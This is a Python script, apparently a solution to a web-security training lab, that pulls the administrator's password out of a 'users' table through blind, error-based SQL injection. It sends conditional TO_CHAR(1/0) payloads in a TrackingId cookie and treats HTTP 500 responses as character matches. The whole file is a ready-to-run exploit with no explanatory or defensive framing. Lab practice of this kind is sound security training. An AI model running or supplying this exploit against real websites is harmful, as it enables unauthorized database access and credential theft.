import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8087','https':'http://127.0.0.1:8087'}

def sqli_exploit(url) :
    
    password = ""
    data_list = "abcdefghijklmnopqrstuvwxyz0123456789"
    
    for i in range(1, 21) :
        for j in data_list :
            payload = "'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+users+WHERE+username='administrator'+AND+SUBSTR(password,%s,1)='%s')='a'--" % (i,j)
            cookies = {'TrackingId':'IkXzZMvwbH02GH6x'+payload, 'session':'1DomC86yvY4oYe5bpXa8YRQZ8QxaS9SL'}
            r = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
            
            if r.status_code == 500 :
                password += j
                sys.stdout.write('\r'+password)
                sys.stdout.flush()
                break
            else :
                sys.stdout.write('\r'+password+j)
                sys.stdout.flush()
            
    return password

def main() :
    if len(sys.argv) >=  2 :
        url = sys.argv[1].strip()
    else :
        print('[+] Usage: %s <url>' % sys.argv[0])
        print('[+] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    password = sqli_exploit(url)
    
    if password :
        print('\nThe password of the administrator is : %s' % password)
    else :
        print('[-] The sql injection exploit has failled.')

if __name__ == '__main__' :
    main()